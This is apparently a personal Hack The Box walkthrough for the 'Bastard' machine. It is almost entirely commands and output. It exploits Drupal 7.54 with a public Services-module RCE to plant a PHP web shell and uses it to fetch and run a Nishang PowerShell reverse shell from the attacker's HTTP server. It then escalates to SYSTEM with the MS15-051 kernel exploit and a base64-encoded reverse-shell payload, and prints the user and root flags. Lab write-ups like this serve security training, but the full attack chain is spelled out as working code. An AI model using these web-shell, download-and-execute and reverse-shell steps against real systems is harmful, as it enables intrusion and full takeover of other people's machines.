# bastard: https://app.hackthebox.com/machines/Bastard

```bash
nmap -sC -sV 10.10.10.9
Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-17 15:00 EDT
Nmap scan report for 10.10.10.9
Host is up (0.091s latency).
Not shown: 997 filtered tcp ports (no-response)
PORT      STATE SERVICE    VERSION
80/tcp    open  tcpwrapped
|_http-generator: Drupal 7 (http://drupal.org)
|_http-server-header: Microsoft-IIS/7.5
|_http-title: Welcome to Bastard | Bastard
135/tcp   open  tcpwrapped
49154/tcp open  tcpwrapped
```
```bash
curl -s http://10.10.10.9/CHANGELOG.txt | grep -m2 ""

Drupal 7.54, 2017-02-01
```

```bash
#visit
https://www.exploit-db.com/exploits/41564

searchsploit 'drupal 7'   
Drupal 7.x Module Services - Remote Code Execution                                         | php/webapps/41564.php

searchsploit -m php/webapps/41564.php                       
  Exploit: Drupal 7.x Module Services - Remote Code Execution
      URL: https://www.exploit-db.com/exploits/41564
     Path: /usr/share/exploitdb/exploits/php/webapps/41564.php
    Codes: N/A
 Verified: True
File Type: C++ source, ASCII text
```

```bash
#Edited in 41564.php

$url = 'http://10.10.10.9';
$endpoint_path = '/rest';
'filename' => 'joker.php',
'data' => '<?php echo system($_REQUEST["joker"]); ?>'
```

```bash
php -e 41564.php                                      
# Exploit Title: Drupal 7.x Services Module Remote Code Execution
# Vendor Homepage: https://www.drupal.org/project/services
# Exploit Author: Charles FOL
# Contact: https://twitter.com/ambionics
# Website: https://www.ambionics.io/blog/drupal-services-module-rce

#!/usr/bin/php
Stored session information in session.json
Stored user information in user.json
Cache contains 7 entries
File written: http://10.10.10.9/joker.php
```

```bash
http://10.10.10.9/joker.php?joker=dir

 Volume in drive C has no label.
 Volume Serial Number is C4CD-C60B

 Directory of C:\inetpub\drupal-7.54

18/04/2023  12:12 §Ł    <DIR>          .
18/04/2023  12:12 §Ł    <DIR>          ..
19/03/2017  01:42 ŁŁ               317 .editorconfig
19/03/2017  01:42 ŁŁ               174 .gitignore
19/03/2017  01:42 ŁŁ             5.969 .htaccess
19/03/2017  01:42 ŁŁ             6.604 authorize.php
19/03/2017  01:42 ŁŁ           110.781 CHANGELOG.txt
19/03/2017  01:42 ŁŁ             1.481 COPYRIGHT.txt
19/03/2017  01:42 ŁŁ               720 cron.php
19/03/2017  01:43 ŁŁ    <DIR>          includes
19/03/2017  01:42 ŁŁ               529 index.php
19/03/2017  01:42 ŁŁ             1.717 INSTALL.mysql.txt
19/03/2017  01:42 ŁŁ             1.874 INSTALL.pgsql.txt
19/03/2017  01:42 ŁŁ               703 install.php
19/03/2017  01:42 ŁŁ             1.298 INSTALL.sqlite.txt
19/03/2017  01:42 ŁŁ            17.995 INSTALL.txt
18/04/2023  12:24 §Ł                41 joker.php
19/03/2017  01:42 ŁŁ            18.092 LICENSE.txt
19/03/2017  01:42 ŁŁ             8.710 MAINTAINERS.txt
19/03/2017  01:43 ŁŁ    <DIR>          misc
19/03/2017  01:43 ŁŁ    <DIR>          modules
19/03/2017  01:43 ŁŁ    <DIR>          profiles
19/03/2017  01:42 ŁŁ             5.382 README.txt
19/03/2017  01:42 ŁŁ             2.189 robots.txt
19/03/2017  01:43 ŁŁ    <DIR>          scripts
19/03/2017  01:43 ŁŁ    <DIR>          sites
19/03/2017  01:43 ŁŁ    <DIR>          themes
19/03/2017  01:42 ŁŁ            19.986 update.php
19/03/2017  01:42 ŁŁ            10.123 UPGRADE.txt
19/03/2017  01:42 ŁŁ             2.200 web.config
19/03/2017  01:42 ŁŁ               417 xmlrpc.php
              22 File(s)        217.302 bytes
               9 Dir(s)   4.121.374.720 bytes free
               9 Dir(s)   4.121.374.720 bytes free
```

```bash
#another way: visit http://10.10.10.9 and create a new cookie as below

cat session.json
{
    "session_name": "SESSd873f26fc11f2b7e6e4aa0f6fce59913",
    "session_id": "rmK-9xgoBFUiyRmtgufQYDYn_ZLzSO877VAzsqEK7XM",
    
}           
```

```bash
locate -r Invoke-PowerShellTcpOneLine.ps1$                   
/opt/nishang/Shells/Invoke-PowerShellTcpOneLine.ps1

cp /opt/nishang/Shells/Invoke-PowerShellTcpOneLine.ps1 .
```

```bash
cat Invoke-PowerShellTcpOneLine.ps1                     
$client = New-Object System.Net.Sockets.TCPClient('10.10.14.38',9999);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()

#$sm=(New-Object Net.Sockets.TCPClient('192.168.254.1',55555)).GetStream();[byte[]]$bt=0..65535|%{0};while(($i=$sm.Read($bt,0,$bt.Length)) -ne 0){;$d=(New-Object Text.ASCIIEncoding).GetString($bt,0,$i);$st=([text.encoding]::ASCII).GetBytes((iex $d 2>&1));$sm.Write($st,0,$st.Length)}

```

```bash
python -m http.server 9998          
Serving HTTP on 0.0.0.0 port 9998 (http://0.0.0.0:9998/) ...

#windows reverse shell
IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.38:9998/Invoke-PowerShellTcpOneLine.ps1')

#visit the URL 
http://10.10.10.9/joker.php?joker=echo IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.38:9998/Invoke-PowerShellTcpOneLine.ps1') | powershell -noprofile -

nc -lvnp 9999
listening on [any] 9999 ...
connect to [10.10.14.38] from (UNKNOWN) [10.10.10.9] 58699
whoami
nt authority\iusr
PS C:\inetpub\drupal-7.54> 
```

```bash
PS C:\Users\dimitris\Desktop> type user.txt
923ca766d7ffbf6d677f253bd46a0be7
```

```bash
wget https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS15-051/MS15-051-KB3045171.zip                                                                                    

Resolving github.com (github.com)... 140.82.121.3
Connecting to github.com (github.com)|140.82.121.3|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: unspecified [text/html]
Saving to: ‘MS15-051-KB3045171.zip’

 unzip MS15-051-KB3045171.zip 
Archive:  MS15-051-KB3045171.zip
  creating: MS15-051-KB3045171/

ls
ms15-051.exe  ms15-051x64.exe  Source
```

```bash
PS C:\inetpub\drupal-7.54> certutil -urlcache -split -f "http://10.10.14.38:9998/ms15-051x64.exe" ms15-051x64.exe
****  Online  ****
  0000  ...
  d800
CertUtil: -URLCache command completed successfully.

PS C:\inetpub\drupal-7.54> .\ms15-051x64.exe whoami
[#] ms15-051 fixed by zcgonvh
[!] process with pid: 892 created.
==============================
nt authority\system
PS C:\inetpub\drupal-7.54> 

```

```bash
PS C:\inetpub\drupal-7.54> .\ms15-051x64.exe "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4AMwA4ACIALAA5ADkAOQA2ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA=="
```

```bash
nc -lvnp 9996
listening on [any] 9996 ...
connect to [10.10.14.38] from (UNKNOWN) [10.10.10.9] 49181
whoami
nt authority\system
PS C:\inetpub\drupal-7.54> type C:\Users\Administrator\Desktop\root.txt
16ec66176452638757650562e7250395

```
***References***

<https://www.revshells.com/> <br>
<https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS15-051> <br>
